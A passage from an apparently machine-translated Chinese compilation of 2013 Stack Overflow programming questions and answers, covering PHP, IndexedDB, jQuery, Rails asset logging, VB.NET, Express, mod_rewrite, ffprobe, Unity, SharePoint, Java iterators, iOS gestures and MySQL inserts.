    $config['cur_tag_open'] = '<span class="current"><a href="#">';
    $config['cur_tag_close'] = '</a></span>';

    $this->pagination->initialize($config);
    $data['offset'] = $offset;
    $data['legends'] = $this->legend_model->get_legend($language_id, $limit, $offset);

    $this->template->write('title', 'Legend : Manage Legend');
    $this->template->write_view('content', 'legend/index', $data);
    $this->template->render(); 
```

# php - 使用 Bootstrap 的 Typeahead 进行字符串连接

> ID：15244722
> 
> 赞同：0
> 
> 时间：2013-03-06T10:26:05.300
> 
> 标签：php, arrays, concatenation, bootstrap-typeahead

我们正在尝试使用包含数组的字符串打印名称列表。我们正在搜索表单内的自动完成输入字段中工作，并且我们正在使用 Bootstrap 的 Typeahead 脚本。

当我们“手动”粘贴数组的结果时，它可以工作，但问题是当我们使用 an`echo`显示包含的所有值时，结果被视为单个值。

```
<?php
$name = array(the_title('"','",'));

foreach ($name as &$name_value) {
   echo $name_value;                    // This prints:   "Name 1", "Name 2", "Name 3",
}
?>

<?php endwhile; ?>

<input type="text" data-provide="typeahead" data-source='[<?php echo $name_value; ?>]'> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T10:51:02.227

见[PHP：json_encode](http://php.net/manual/fr/function.json-encode.php)

```
<?php
    $names = array('Name1', 'Name2', 'Name3');
    echo '<input type="text" data-provide="typeahead" data-source=\''.json_encode($names).'\' />';
?> 
```

# indexeddb - 我可以在 IndexedDb 对象库中指定“唯一一起”约束吗？

> ID：15244723
> 
> 赞同：3
> 
> 时间：2013-03-06T10:26:06.737
> 
> 标签：indexeddb

我使用 IndexedDb 存储一些数据以供离线使用。我需要确保在对象存储中没有两个对象具有相同的某些属性。

例如，我的对象存储中存储电影详细信息的对象如下：

```
{title : value1, director : value2, writer : value3, revenue : value4} 
```

现在，当我添加数据时，我不想要 2 个具有相同 {title、director、writer} 的对象。根据我的探索，我可以在字段上创建索引并为此索引指定 unique = true。这样，对于这个特定字段，没有 2 个对象可以具有相同的值。但是，有没有办法在对象存储中指定这些“唯一一起”的字段。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-06T13:35:27.803

正如我在最新版本的[规范](http://www.w3.org/TR/IndexedDB/#widl-IDBObjectStore-createIndex-IDBIndex-DOMString-name-any-keyPath-IDBIndexParameters-optionalParameters)中看到的那样，这应该是可能的。您可以通过将数组作为键路径传递来做到这一点。我自己没有尝试过，但这应该是解决方案。我建议您使用 firefox 的夜间版本来测试它。这将为您提供最大的可能性来实现工作。

```
objectstore.createIndex("indexname", ["title", "director", "writer"], { unique: true }); 
```

# javascript - 点击后Jquery添加跨度

> ID：15244725
> 
> 赞同：1
> 
> 时间：2013-03-06T10:26:12.037
> 
> 标签：javascript, jquery, css

嗨，如何添加新的选择器并将当前选择器替换为已单击的链接？以下是我点击前的链接：

```
<a href="#">Date</a> 
```

点击后链接：

```
<span title="" class="i-wrap ig-wrap-common i-sort-descend-common-wrap ig-wrap-common-r selected whatsthis"><i class="i ig-common i-sort-descend-common"></i> Date </span> 
```

以下是我上面链接的 html 片段：

```
<div id="review_sort_section" class="ieSucks">Sort by:

                <a href="#">Date</a>
             | 
                <a href="#">Rating</a>
             | 

    </div> 
```

谢谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-06T10:30:15.520

```
$('#review_sort_section a').click(function() {
    var span = '<span title="" class="i-wrap ig-wrap-common i-sort-descend-common-wrap ig-wrap-common-r selected whatsthis"><i class="i ig-common i-sort-descend-common"></i>' + $(this).text() + '</span>';
    $(this).replaceWith(span);
}); 
```

这是一个更新要求的演示：http: [//jsfiddle.net/DDCbe/](http://jsfiddle.net/DDCbe/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-06T10:32:19.157

```
$(function(){
  $('#review_sort_section a').click(function(){
    var new_content='<span title="" class="i-wrap ig-wrap-common i-sort-descend-common-wrap ig-wrap-common-r selected whatsthis"><i class="i ig-common i-sort-descend-common"></i> Date </span>';
    $(this).replaceWith(new_content);
 });
}); 
```

# ruby-on-rails-3.2 - 开发模式下如何避免资产消息

> ID：15244727
> 
> 赞同：0
> 
> 时间：2013-03-06T10:26:16.047
> 
> 标签：ruby-on-rails-3.2, asset-pipeline

```
Started GET "/assets/reset.css?body=1" for 70.63.17.68 at Wed Oct 12 20:10:49 +0000 2011
Served asset /reset.css - 304 Not Modified (1ms)

Started GET "/assets/style.css?body=1" for 70.63.17.68 at Wed Oct 12 20:10:49 +0000 2011
Served asset /style.css - 304 Not Modified (0ms)

Started GET "/assets/application.css?body=1" for 70.63.17.68 at Wed Oct 12 20:10:49 +0000 2011
Started asset /application.css - 304 Not Modified (0ms)

Started GET "/assets/application.js?body=1" for 70.63.17.68 at Wed Oct 12 20:10:49 +0000 2011
Served asset /application.js - 200 OK (1ms) 
```

我想避免此消息，如果我关闭调试模式，

```
config.assets.debug = off 
```

资产文件将作为连接。

无论如何要摆脱这些消息以及资产应该提供单独的资产文件。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T14:14:15.397

在您的 gemfile 上使用`gem 'quiet_assets'`

```
group :development do
  gem 'sqlite3'
  gem 'quiet_assets'
end 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-06T10:30:57.303

配置/初始化程序/quite_assets.rb

```
if Rails.env.development?
  Rails.application.assets.logger = Logger.new('/dev/null')
    Rails::Rack::Logger.class_eval do
      def call_with_quiet_assets(env)
        previous_level = Rails.logger.level
        Rails.logger.level = Logger::ERROR if env['PATH_INFO'] =~ %r{^/assets/}
        call_without_quiet_assets(env)
      ensure
        Rails.logger.level = previous_level
      end
    alias_method_chain :call, :quiet_assets
  end
end 
```

# visual-studio-2010 - ASP.NET MVC 4 数据模型列错误

> ID：15244733
> 
> 赞同：0
> 
> 时间：2013-03-06T10:26:26.983
> 
> 标签：visual-studio-2010, ado.net-entity-data-model, columnname

我在 Visual Studio 2010 中创建了新的 ADO.NET 数据实体模型。一切正常 .sql 服务器列名是“tag”，但模型中的列名是“tag1”或“category1”。所有列名结束 1 sql 表是正常的。TagID 是主键和自动增量，但为什么会发生这种情况？谢谢。

# asp.net - 如何检索 SQL 查询（最后一条记录 id）+ 在 ASP.NET 中执行它并用字符串连接（追加/前置）它

> ID：15244738
> 
> 赞同：0
> 
> 时间：2013-03-06T10:26:39.690
> 
> 标签：asp.net, sql, vb.net

我正在尝试使用 SQL 查询检索表中的最后一个 ID，然后将结果与 TextBox 值（它是一个字符串）一起附加：

```
Dim searchforID = New OleDbCommand("select ID from [table1] where ID = (select max(id) from [table1])", con)
Dim variable1 = searchforID + TextBox1.Text 
```

但它抛出了这个错误：

> 编译器错误消息：BC30452：未为类型“System.Data.OleDb.OleDbCommand”和“String”定义运算符“+”。

## 试图修复它

-- 所以我尝试像这样转换返回的记录 ID：

```
Dim variable1 = Convert.ToString(searchforID) + TextBox1.Text 
```

现在没有错误但不幸的是返回的结果是“System.Data.OleDb.OleDb”+文本框值，例如：
**System.Data.OleDb.OleDbtest**

-- 我也想过将返回的记录 ID 转换为整数会引发错误：

> 异常详细信息：System.InvalidCastException：无法将“System.Data.OleDb.OleDbCommand”类型的对象转换为“System.IConvertible”类型。

### 那么为什么检索最后一条记录 ID 会失败呢？我的 SQL 查询可能是假的吗？

谢谢你。

* * *

# 如果有人发现它有用，那么直接解决问题：

```
Dim searchforID = New OleDbCommand("select MAX(ID) from [table1]", con)
Dim variable1 = searchforID.ExecuteScalar() & TextBox1.Text 
```

下面的答案和评论也有有用的信息。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-06T10:30:23.437

```
Dim variable1 = searchforID.ExecuteScalar() & TextBox1.Text 
```

searchforID 是 ICommand，不是值，如果要得到结果，需要执行命令并得到结果。ExecuteScalar 从查询返回第一行的第一个单元格值

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-06T10:31:23.083

```
Dim cmd = New OleDbCommand("select MAX(ID) from [table1]", con)
Dim variable1 = cmd.ExecuteScalar().ToString() & TextBox1.Text 
```

首先，如果你有命令，你应该**执行**命令。有几种方法可以执行 a `DbCommand`，具体取决于命令的类型。

二、想要最大id，直接去查询最大！嵌套子查询是多余的。

第三，`&`用于连接字符串比`+`. 请参阅[此处](https://stackoverflow.com/q/734600/1174942)了解更多信息。

# .net - Visual Studio 中是否有不同的文件夹类型？

> ID：15244743
> 
> 赞同：0
> 
> 时间：2013-03-06T10:26:53.720
> 
> 标签：.net, visual-studio

在 Visual Studio 2010 中，我们在 App_Code 中有一个文件夹无法识别我们的一些 web_references，我注意到在过去几天中，解决方案资源管理器中的文件夹 (CommonSignUp) 外观已从灰色变为黄色。有人可以告诉我这两种文件夹类型是什么，以及是否有办法从一种类型转换为另一种类型。是的，在这里抓住稻草，但我认为这个文件夹发生了一些事情。

![在此处输入图像描述](../Images/86dd506eda1e3cf2ca168f442243214d.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-06T10:29:59.107

你可以[在这里](http://www.codeproject.com/Articles/31557/A-Beginner-s-Guide-to-ASP-NET-Application-Folders)阅读。您还可以使用文本编辑器浏览项目文件并查看文件夹的外观。

# javascript - Express JS 通过控制台日志查看

> ID：15244745
> 
> 赞同：0
> 
> 时间：2013-03-06T10:26:56.333
> 
> 标签：javascript, node.js, express

我想将 console.log 函数传递给我在 Node Express 中的视图，我尝试过：

```
res.render('index', {
"title" : 'My page',
"logger": console.log
} 
```

我也试过这个

```
res.render('index', {
"title" : 'My page',
"logger": function () {
        console.log(arguments);
    }
} 
```

但它总是空洞的，我错过了什么吗？

**fwiw**这就是我试图在我的视图中输出它的方式

```
script
    log = #{logger}; 
```

## 对于那些想知道原因的人

我在移动时在我的 iPad 2 上开发（它已越狱），Apple 在他们的智慧中删除了最近版本中的开发工具栏，所以我遇到了非常糟糕的警报，所以我想要一个临时的 console.log 到我的终端。

[编辑]

## 如果我使用 Socket I/O

我可以在后端订阅前端的“日志”事件，并将这些事件和数据发送到控制台日志。

我没有把它作为答案，因为我认为这不是最好的方法，但我认为这会起作用。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-06T18:25:49.643

I think you could expose the console.log() function in app.locals if you're using Express 3\. See the documentation [here](http://expressjs.com/api.html#app.locals).

So, where you configure your server you might have something like...

```
app.configure(function(){
  // some other configuration code

  app.locals.logger = function(arguments) {
    console.log(arguments);
  }

}); 
```

Which you could then access in your view like this...

```
script
  var log = #{logger};
  log("Hello, world!"); 
```

Which in Chrome, for example, logs "Hello, world!" to the web inspector.

# apache - URL重写停止工作

> ID：15244748
> 
> 赞同：0
> 
> 时间：2013-03-06T10:27:04.367
> 
> 标签：apache, mod-rewrite, url-rewriting, url-redirection

对于这个网站 www.demoeial.be，我对每个链接都使用了 URL 重写。这是文章的重写规则：

```
Options +FollowSymlinks
RewriteEngine on
RewriteRule ^artikels/([0-9]+)/(.*).dhtml http://www.demoeial.be/articles.php?article_id=$1 [NC]
RewriteRule ^prints/([0-9]+)/(.*).dhtml http://www.demoeial.be/print.php?action=view&print_id=$1 [NC]
RewriteRule ^auteur/([0-9]+)/([0-9]+)/(.*).dhtml http://www.demoeial.be/author.php?action=view&author_id=$1&page=$2 [NC]

RewriteRule ^nieuws/([0-9]+)/$ category.php?cat_id=1&page=$1
RewriteRule ^dossiers/([0-9]+)/(.*)/([0-9]+)/$ dossiers.php?dossier_id=$1&page=$3
RewriteRule ^interviews/([0-9]+)/$ category.php?cat_id=4&page=$1
RewriteRule ^reportages/([0-9]+)/$ category.php?cat_id=5&page=$1
RewriteRule ^cultuur/([0-9]+)/$ category.php?cat_id=6&page=$1
RewriteRule ^opinie/([0-9]+)/$ category.php?cat_id=2&page=$1
RewriteRule ^satire/([0-9]+)/$ category.php?cat_id=7&page=$1
RewriteRule ^politiek-filosofie/([0-9]+)/$ category.php?cat_id=8&page=$1
RewriteRule ^literair/([0-9]+)/$ category.php?cat_id=9&page=$1
RewriteRule ^muziek/([0-9]+)/$ category.php?cat_id=10&page=$1
RewriteRule ^meewerken/$ content.php?content_id=2
RewriteRule ^over/$ content.php?content_id=1
RewriteRule ^zoeken/(.*)/([0-9]+)/$ search.php?search_words=$1&page=$2

RewriteRule ^print/([0-9]+)/$ print.php?page=$1

<IfModule mod_deflate.c>
    AddOutputFilterByType DEFLATE text/css text/javascript application/x-javascript application/javascript text/x-component text/html text/richtext image/svg+xml text/plain text/xsd text/xsl text/xml image/x-icon application/json
</IfModule> 
```

它以前可以工作，但由于一段时间以来浏览器显然被重定向到服务器链接。例如[http://www.demoeial.be/artikels/10436/Studentenoverleg-VGC-levert-weinig-op.dhtml](http://www.demoeial.be/artikels/10436/Studentenoverleg-VGC-levert-weinig-op.dhtml)转到[http://www.demoeial.be/articles.php?article_id=10436](http://www.demoeial.be/articles.php?article_id=10436)。在它从未显示第二个链接之前，一直显示好看的链接。我不知道发生了什么或改变了什么，但它以前工作过。有什么猜测吗？

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T16:54:22.523

我怀疑*它以前是否有效*。以替换 URL开头的规则`http://`会创建重定向。更改此规则：

```
RewriteRule ^artikels/([0-9]+)/(.*).dhtml http://www.demoeial.be/articles.php?article_id=$1 [NC] 
```

对此：

```
RewriteRule ^artikels/([0-9]+)/(.*).dhtml articles.php?article_id=$1 [NC] 
```

# outlook - 如何迭代 Oulook 中的对话？

> ID：15244750
> 
> 赞同：1
> 
> 时间：2013-03-06T10:27:05.783
> 
> 标签：outlook, outlook-addin

我正在构建一个将类别设置为电子邮件的 Outlook 插件，我有一个特殊情况，如果我匹配我正在寻找的主题，我需要设置整个对话类别，即整个线程需要设置为一个类别，我一直在使用对话对象，但徒劳无功，任何人都可以帮我解决这个问题。

# asp.net - 用于多个应用程序和 CDN 的相同 WebResource.axd / ScriptResource.axd

> ID：15244754
> 
> 赞同：0
> 
> 时间：2013-03-06T10:27:11.997
> 
> 标签：asp.net, embedded-resource, cdn

是否可以强制 ASP.NET`WebResource.axd / ScriptResource.axd`从不同的 Web 应用程序生成 URL 的相同哈希部分？

例如，我有`MyControls.dll`嵌入资源“ `control.js`”，它在两个网站中使用：www.site1.com、www.site2.com（MyControls.dll 存在于两个站点的 bin 文件夹中）。对于每个网站，ASP.NET 为“control.js”生成具有不同哈希的 WebResource.axd URL。

**问题：**我可以以某种方式强制这两个站点的资源 URL 相同吗？

为什么我需要这个……？我对两个网站的资源都使用“共享”CDN。它适用于所有资源，除了`WebResource.axd / ScriptResource.axd`. 当从 www.site2.com 请求资源时，CDN 尝试从 www.site1.com 检索资源进行缓存，但由于从 www.site2.com 到达的哈希值不同，CDN 无法加载和缓存资源。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T11:28:12.347

您可以使用 asp:ScriptManager 来“解绑”资源 - 对于代理缓存来说更好，因为它们不倾向于使用查询字符串来缓存 URL

```
<asp:ScriptManager ID="Script" runat="server" EnablePartialRendering="true">
  <Scripts>
      <asp:ScriptReference Name="MicrosoftAjax.js" Assembly="System.Web.Extensions" Path="~/js/ms/MicrosoftAjax.js" >
      <asp:ScriptReference Name="MicrosoftAjaxWebForms.js" Assembly="System.Web.Extensions" Path="~/js/ms/MicrosoftAjaxWebForms.js">
  </Scripts>
</asp:ScriptManager> 
```

如果您确实选择了这种方法，请不要忘记启用 gzip 和适当的缓存指令。

# video - 如何获取视频文件的 I/P/B 帧数？

> ID：15244758
> 
> 赞同：6
> 
> 时间：2013-03-06T10:27:25.783
> 
> 标签：video, opencv, ffmpeg, libavcodec, libavformat

我想提取视频文件的信息以获取其 I/P/B 帧的计数。如何在ffmpeg中做到这一点？或者我应该使用 libavformat 和 libavcodec 进行编程吗？非常感谢！

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-03-06T14:46:13.020

在命令行上使用`ffprobe -show_frames input_file`. 您可以解析此输入以获取帧类型信息。

你也可以做 `ffprobe -show_frames inputfile | grep pict_type`

grep 的字符串可能因您拥有的 ffprobe 版本而异。

# unity3d - 与胶囊对撞机的碰撞

> ID：15244759
> 
> 赞同：0
> 
> 时间：2013-03-06T10:27:26.827
> 
> 标签：unity3d, collision-detection, unityscript

我正在使用两个角色。我在这两个角色上都使用了角色控制器。但是我也在这些角色上放置了胶囊和胶囊对撞机。但我希望碰撞检测胶囊何时相互碰撞。我正在使用 OnTriggerEnter 函数。而且这两个角色都有没有重力的刚体，并且点击了 IsTrigger ......但是我的 TriggerFunction 不起作用......

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T13:03:16.263

您需要检查其中一个`IsTrigger`上的刻度线，`Collider`并且该`OnTriggerEnter`方法应该在第二个对象中，这不是触发器（它也可以是触发器）。

PS：
来自[OnTriggerEnter 脚本参考](http://docs.unity3d.com/Documentation/ScriptReference/MonoBehaviour.OnTriggerEnter.html)-

> 请注意，仅当其中一个对撞机还附加了刚体时才会发送触发事件。

# sharepoint - 使用 SharePoint 指导库在 SharePoint 2010 中实现日志记录

> ID：15244761
> 
> 赞同：1
> 
> 时间：2013-03-06T10:27:30.750
> 
> 标签：sharepoint, sharepoint-2010

我尝试使用 SharePoint 指导库，但出现此错误。有人有答案或建议吗？

谢谢

```
Error is :
One or more error occurred while writing messages into the log.\r\nThe error while writing to the EventLog was:An exception has occurred.
    ExceptionType: 'LoggingException'
    ExceptionMessage: 'The Category 'Custom Error/DUET' was not found in the diagnostic categories collections.'
    StackTrace: '   at Microsoft.Practices.SharePoint.Common.Logging.DiagnosticsService.GetCategory(String categoryName)
           at Microsoft.Practices.SharePoint.Common.Logging.DiagnosticsService.LogTrace(String message, Int32 eventId, TraceSeverity severity, String categoryName)
           at Microsoft.Practices.SharePoint.Common.Logging.TraceLogger.Trace(String message, Int32 eventId, TraceSeverity severity, String category)
           at Microsoft.Practices.SharePoint.Common.Logging.SharePointLogger.WriteToDeveloperTrace(String message, Int32 eventId, TraceSeverity severity, String category)'
    Source: 'Microsoft.Practices.SharePoint.Common'
    TargetSite: 'Microsoft.SharePoint.Administration.SPDiagnosticsCategory GetCategory(System.String)'
\r\n Orginal logged message was: An error occurred while writing tot the Trace Log, trace message:kaka Error in Constant recovery
    ExceptionType: 'Exception'
    ExceptionMessage: 'testing sohail'
    StackTrace: ''
    Source: ''
    TargetSite: '' 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-16T17:28:01.987

其他人说的都是对的。当您将代码部署到共享点环境时，您需要创建并注册您的类别。我通过执行以下操作创建了日志记录：

*   我创建了一个场解决方案，将在场上部署所有日志记录逻辑
*   在功能激活码上，我检查了我的日志记录类别是否存在。如果没有，我创建它
*   当我删除我的解决方案时，我删除了我的自定义类别（这是可选的）

这是一个描述如何创建和注册您的类别的链接：

[http://msmvps.com/blogs/sundar_narasiman/archive/2012/06/20/how-to-implement-logging-in-sharepoint-2010-part-2.aspx](http://msmvps.com/blogs/sundar_narasiman/archive/2012/06/20/how-to-implement-logging-in-sharepoint-2010-part-2.aspx)

# java - 为什么java中的集合没有只读迭代器概念？

> ID：15244762
> 
> 赞同：2
> 
> 时间：2013-03-06T10:27:32.843
> 
> 标签：java, design-patterns, collections

java的[Enumeration](http://docs.oracle.com/javase/1.4.2/docs/api/java/util/Enumeration.html) 接口有2个方法

1.  有下一个（）
2.  下一个（）

为什么[Iterator](http://docs.oracle.com/javase/1.4.2/docs/api/java/util/Iterator.html)不扩展 Enumeration 并添加 remove 方法（）？

此外，如果我只想循环遍历我的集合，我可以使用枚举（或迭代器，如果它扩展枚举），因为循环语句只需要枚举。我不必担心收藏被修改

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-06T10:35:30.943

> 为什么不`Iterator`扩展`Enumeration`和添加`remove()`方法？

从[文档](http://docs.oracle.com/javase/7/docs/api/java/util/Iterator.html)中：

> `Iterator``Enumeration`在 Java 集合框架中取代。迭代器在两个方面不同于枚举：
> 
> *   迭代器允许调用者在具有明确定义的语义的迭代期间从底层集合中删除元素。
> *   **方法名称已得到改进。**

我怀疑后者是引入全新界面而不是扩展现有界面的真正原因。

> 此外，如果我只想循环遍历我的集合，我可以使用枚举（或迭代器，如果它扩展枚举），因为循环语句只需要枚举。我不必担心收藏被修改

好吧，如果您不想修改集合，请不要调用`remove()`. 如果您真的，真的不相信自己，您可以使用[`Collections.unmodifiableCollection()`](http://docs.oracle.com/javase/7/docs/api/java/util/Collections.html#unmodifiableCollection%28java.util.Collection%29)et al 创建一个只读包装器。

最后，值得注意的是，如果您使用 for-each 循环遍历集合，则`remove()`无论如何您都无法访问该方法：

```
for (String s : str_list) {
   ...
} 
```

在这里，我们正在使用`Iterator`接口，但无法访问实际的迭代器对象。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-06T10:35:06.763

您可以通过[java.util.Collections.enumeration()](http://docs.oracle.com/javase/6/docs/api/java/util/Collections.html#enumeration%28java.util.Collection%29)方法从您的集合中获取 java.util.Enumerator 。

无论如何，如果您不想通过它的迭代器修改您的集合，只需不调用 remove() 方法即可。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2014-02-25T09:33:37.597

根据[http://www.journaldev.com/1330/java-collections-interview-questions-and-answers#iterator-vs-enumeration](http://www.journaldev.com/1330/java-collections-interview-questions-and-answers#iterator-vs-enumeration)，“枚举速度是迭代器的两倍，并且使用的内存非常少。枚举是非常基本的并满足基本需求。”

所以，我猜如果你不需要 remove()，那么使用 Enumeration 比使用 Iterator 更有效。

# ios - 为什么点击手势识别器会从其父视图的视图中识别点击？

> ID：15244765
> 
> 赞同：2
> 
> 时间：2013-03-06T10:27:37.733
> 
> 标签：ios, uigesturerecognizer

我有一个 UIView 和一个点击手势识别器：

```
UIImageView *tabView = [[UIImageView alloc] initWithFrame:CGRectMake(41, 145, 702, 100)];
tabView.image = [UIImage imageNamed:@"inactive_tab"];
tabView.userInteractionEnabled = YES;
UITapGestureRecognizer *singleFingerTap =
[[UITapGestureRecognizer alloc] initWithTarget:self
                                        action:@selector(handleSingleTap:)];
[tabView addGestureRecognizer:singleFingerTap];
[self.scrollView addSubview:tabView]; 
```

我在滚动视图上添加了另一个视图：

```
[self.scrollView addSubview:self.activeTab]; 
```

activeTab 在 inactiveTap 之上。当我点击 activeTap 时，手势识别器会触发，我不想发生这种情况。我怎样才能避免这种情况？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-03-06T10:33:18.723

用途`UIGestureRecognizerDelegate`及其方法`gestureRecognizer:shouldReceiveTouch:`。您可以检查触摸点是否在视图框架内，`NO`如果您不希望触摸发生在该视图上，则返回。`

```
-(BOOL)gestureRecognizer:(UIGestureRecognizer *)gestureRecognizer shouldReceiveTouch:(UITouch *)touch {
    CGPoint touchLocation = [touch locationInView:self.view];
    return !CGRectContainsPoint(self.activeTab.frame, touchLocation);
} 
```

# nfc - 如何知道共享的 NFC 标签已发送给某人

> ID：15244774
> 
> 赞同：2
> 
> 时间：2013-03-06T10:28:05.283
> 
> 标签：nfc, phonegap-plugins, nfc-p2p

我通过 PhoneGap NFC 插件（[链接](https://github.com/chariotsolutions/phonegap-nfc)）在我的三星 Galaxy S3 上共享了一个 NFC 标签然后我将手机放在阅读器 ACR122U 上并发送标签。我想知道如何检测标签被某人读取或发送到某个地方。

```
var record = ndef.mimeMediaRecord("Text", nfc.stringToBytes(id), nfc.stringToBytes(id));
    nfc.share(
        [record],
        function () {
            alert("Wrote data to tag.");
        },
        function (reason) {
            alert(reason, function () {
            }, "There was a problem");
        }
    ); 
```

# jquery-ui - jquery ui 选项卡的 api 文档中的“.selector”

> ID：15244778
> 
> 赞同：0
> 
> 时间：2013-03-06T10:28:22.523
> 
> 标签：jquery-ui, tabs

我正在使用 jquery ui 选项卡，它运行良好。这是 jquery-ui 选项卡的代码

```
$(function() {
  $( "#tabs" ).tabs();
}); 
```

突然我遇到了一个场景，我必须找到当前活动选项卡的索引。所以我浏览了[Api 文档](http://api.jqueryui.com/tabs/)并找到了下面的代码。

```
Get or set the active option, after initialization:
// getter
var active = $( ".selector" ).tabs( "option", "active" );
// setter
$( ".selector" ).tabs( "option", "active", 1 ); 
```

什么是“.selector”，我如何获取活动选项卡活动选项卡的当前索引？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-06T10:33:43.073

`.selector`是您调用的元素`tabs()`，因此如果您的第一个代码片段来自您的代码，则需要替换`.selector`为`#tabs`.

例如：

```
var active = $("#tabs").tabs( "option", "active"); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-06T10:34:56.503

这是有关 Jquery UI 选项卡的一些文档-我没有与他们合作太多...

[jQuery UI 文档（选项卡）](http://docs.jquery.com/UI/Tabs#method-select)

它可能是这样的

```
.tabs( "select" , index ) 
```

或者

```
$('#nameOftabs').tabs({ selected: index }); 
```

其中 index 将是您希望选择的默认选项卡。

更多答案

[回答 1](https://stackoverflow.com/questions/9960950/how-to-get-current-tab-title-which-i-named-in-jquery-tabs-ui) [回答 2](https://stackoverflow.com/questions/300078/jquery-ui-tabs-get-currently-selected-tab-index)

希望这可以帮助

# mysql - 从子查询插入

> ID：15244783
> 
> 赞同：1
> 
> 时间：2013-03-06T10:28:28.190
> 
> 标签：mysql, magento

我正在尝试根据子查询的结果进行插入，但我不断收到相同的错误：

```
Operand should contain 1 column(s) 
```

这是查询：

```
INSERT INTO customer_entity_int

(attribute_id, entity_type_id, entity_id, `value`)

VALUES (14, (
    SELECT entity_type_id, entity_id, `value`
    FROM customer_entity_int
    WHERE attribute_id = 13
    AND entity_id NOT
    IN (
        SELECT entity_id
        FROM customer_entity_int
        WHERE attribute_id = 14
    )
)) 
```

如何为我的插入选择多于一列？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-06T10:30:44.790

您将要使用`INSERT INTO...SELECT FROM`而不是`INSERT INTO..VALUES`：

```
INSERT INTO customer_entity_int (attribute_id, entity_type_id, entity_id, `value`)
SELECT 14, entity_type_id, entity_id, `value`
FROM customer_entity_int
WHERE attribute_id = 13
  AND entity_id NOT IN (SELECT entity_id
                        FROM customer_entity_int
                        WHERE attribute_id = 14) 
```

您可以在`SELECT`列表中包含一个静态值`attribute_id`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-06T10:30:04.510

尝试dis：

```
INSERT INTO customer_entity_int

(attribute_id, entity_type_id, entity_id, `value`)

    SELECT 14, entity_type_id, entity_id, `value`
    FROM customer_entity_int
    WHERE attribute_id = 13
    AND entity_id NOT
    IN (
        SELECT entity_id
        FROM customer_entity_int
        WHERE attribute_id = 14
    ) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-06T10:36:00.040

请尝试以下代码......

```
INSERT INTO customer_entity_int
(attribute_id, entity_type_id, entity_id, `value`)
SELECT 14, entity_type_id, entity_id, `value`
FROM customer_entity_int
WHERE attribute_id = 13
AND entity_id NOT
IN (
    SELECT entity_id
    FROM customer_entity_int
    WHERE attribute_id = 14
   ) 
```

# iphone - iPhone使用svg忽略背景位置

> ID：15244788
> 
> 赞同：2
> 
> 时间：2013-03-06T10:28:35.037
> 
> 标签：iphone, css, svg, mobile-safari, background-position

我在一个简单的锚元素上使用 svg 背景图像，并且需要将图形定位在元素的右侧。

它适用于大多数浏览器，除了 iPhone（在 iPad 上很好）。

我已经设置了两个代码笔 - 除了使用 gif 或 svg 图像外，其他代码相同。gif 正确定位在右侧，但 svg 没有。

gif - 在 iPhone 上正确定位 - [http://codepen.io/johnholtripley/pen/yLDwF](http://codepen.io/johnholtripley/pen/yLDwF)

svg - 在 iPhone 上的位置不正确 - [http://codepen.io/johnholtripley/pen/maCkb](http://codepen.io/johnholtripley/pen/maCkb)

我看不到有关此问题的任何其他报告 - 这是一个已知问题吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T12:35:23.230

刚刚看到 caniuse.com 的 svg 条目上的脚注 - “iOS Safari 和旧 Safari 版本中的部分支持是指不支持平铺或背景位置属性。” - [http://caniuse.com/svg-css](http://caniuse.com/svg-css)

有什么可用的解决方法吗？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-06T10:55:16.863

如果您使用的是 iPhone，您还没有说明什么“类型”。如果您使用的是较旧的 iPhone，某些内容可能看起来不正确，因为浏览器不是最新的（因为该设备的更新已停止）。前段时间我在开发一个网站时，我在我的 iPod Touch 2 上查看了它，内容看起来有些失真；而当我在较新的设备（第 5 代）上查找相同的内容时，内容显示正确。

# java - R.java 文件在清理项目时突然被删除

> ID：15244790
> 
> 赞同：-1
> 
> 时间：2013-03-06T10:28:55.880
> 
> 标签：java, android, xml

关于清理项目以更新图像 我在 gen 文件夹中的 R.java 文件被删除了，不知道如何删除，结果给出了错误如何恢复它

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-06T10:34:22.180

删除 gen 和 bin 文件夹。并执行构建。如果没有生成 R.java 文件，则可能是您的资源有一些错误。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-06T10:30:19.933

检查您的 Android 清单文件。我敢打赌你那里有一个错字。如果 manifest 清晰，`R.java`将自动重新生成。

`R.java`还要删除对您可能错误导入的源文件的所有引用。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-06T10:39:17.660

检查您的资源文件。请记住，您的文件名必须仅包含 [a-z0-9_.] 没有“-”。

知道问题出在哪里的最好方法是检查 eclipse 中的“问题”视图。

# .net-4.0 - Spring.Net 占位符异常

> ID：15244793
> 
> 赞同：1
> 
> 时间：2013-03-06T10:28:57.197
> 
> 标签：.net-4.0, .net-3.5, spring.net

在尝试将我的项目从 .NET 3.5 转换为 .NET 4 时，我遇到了 Spring.net 最奇怪的问题。

